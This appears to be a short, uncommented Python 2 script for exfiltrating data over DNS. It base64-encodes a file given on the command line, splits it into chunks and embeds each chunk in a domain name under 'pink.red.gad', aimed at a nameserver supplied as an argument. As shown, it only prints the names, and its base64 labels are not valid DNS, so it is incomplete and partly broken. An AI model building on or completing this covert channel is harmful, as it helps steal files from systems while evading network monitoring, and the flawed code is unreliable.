#!/usr/bin/python
import sys
import dns.resolver
from binascii import b2a_base64

def sendRequest(data, server):
  i = 0
  myns = dns.resolver.Resolver()
  myns.nameservers = [server] 
  
  print myns.nameservers
  for d in data:
    d = d.strip()
    domain = str(i)+'.'+d+'.pink.red.gad'
    print domain
    i = i + 1
def chunks(l, n):
  for i in xrange(0, len(l), n):
      yield l[i:i+n]

if __name__ == '__main__':
  infile = sys.argv[1]
  server = sys.argv[2]
  openfile = open(infile, "rb").read()
  data = b2a_base64(openfile)
  datalist = list(chunks(data,52))
  sendRequest(datalist, server)
